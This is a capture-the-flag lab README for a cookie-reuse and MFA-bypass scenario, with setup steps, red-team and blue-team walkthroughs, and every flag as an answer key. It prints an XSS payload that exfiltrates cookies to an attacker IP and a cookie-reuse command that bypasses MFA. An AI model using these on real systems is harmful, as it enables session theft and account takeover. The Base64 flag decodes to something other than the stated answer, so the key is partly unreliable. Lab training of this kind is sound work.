# NMD Cyber Range - CTF Lab (Cookies Reuse & MFA Bypass)
** Arkana Asa Andoko **

## 1. Deployment Instructions (Proxmox Environment)
1. Clone this repository inside your Proxmox Linux VM.
2. Run the automated setup script to configure the Blue Team SSH access and inject mock telemetry logs:
   `sudo ./setup.sh`
3. Start the vulnerable Node.js application using Docker Compose:
   `sudo docker-compose up -d --build`
4. The web application will run on port `3075`, and Blue Team SSH is accessible on port `2275`.

---

## 2. Red Team Walkthrough (Exploitation)
### Phase 1: Reconnaissance
* Expose backend via headers: `curl -I http://<VM_IP>:3075/` -> yields `SCENARIO75{Node.js}` & `SCENARIO75{pre_mfa_session}`.
* Check source code for hints -> yields `SCENARIO75{robots.txt}`.
* Read hidden paths: `curl http://<VM_IP>:3075/robots.txt` -> yields `SCENARIO75{/api/verify-mfa}` & `SCENARIO75{/dashboard}`.

### Phase 2: Defense Evasion (WAF & XSS)
* Endpoint only accepts POST -> yields `SCENARIO75{POST}`.
* Sending `<script>` is blocked (403) -> yields `SCENARIO75{403}`.
* Direct cookie access is obfuscated -> yields `SCENARIO75{window['docu'+'ment']['coo'+'kie']}`.
* Bypass WAF using HTML5 `<svg>` and `fetch` exfiltration -> yields `SCENARIO75{<svg>}`, `SCENARIO75{fetch}`, and `SCENARIO75{False}`.
  * **Payload:** `<svg onload="fetch('http://10.10.14.50/?c='+window['document']['cookie'])">`

### Phase 3: Initial Access (MFA Bypass)
* Stolen `pre_mfa_session` cookie is reused to access the dashboard:
  `curl -i -b "pre_mfa_session=pending_mfa_verification" http://<VM_IP>:3075/dashboard`
* This bypasses MFA -> yields `SCENARIO75{/api/verify-mfa}`.
* Reveals session prefix -> yields `SCENARIO75{adm_sess}`.
* XSS payload is reflected -> yields `SCENARIO75{xss-payload}`.
* Final Victory Flag located in the source code -> `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}`.

---

## 3. Blue Team Walkthrough (Log Forensics)
* Logs are stored in `/opt/admin/logs` -> `SCENARIO75{/opt/admin/logs}`.
* Analyzed `access.log` to find attacker IP `10.10.14.50` -> `SCENARIO75{10.10.14.50}` and `SCENARIO75{Mozilla/5.0}`.
* Verified 200 OK access to dashboard at 18:51:55 -> `SCENARIO75{200}` and `SCENARIO75{18:51:55}`.
* Exfiltrated Base64 string found in X-Forwarded-For -> `SCENARIO75{UEhBT1RPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}`.
* Decoded the Base64 string (44 characters length, `SCENARIO75{44}`) to retrieve the final Blue Team flag: `SCENARIO75{BLUE_LOG_HUnt3r_M4st3r}`.
* Checked `error.log` for WAF alerts at 18:50:15 -> `SCENARIO75{<script>}` and `SCENARIO75{18:50:15}`.
* Confirmed MFA bypass anomaly at 18:53:10 -> `SCENARIO75{18:53:10}` with `CRITICAL` severity (`SCENARIO75{CRITICAL}`) and message `SCENARIO75{Authentication bypass anomaly}`.
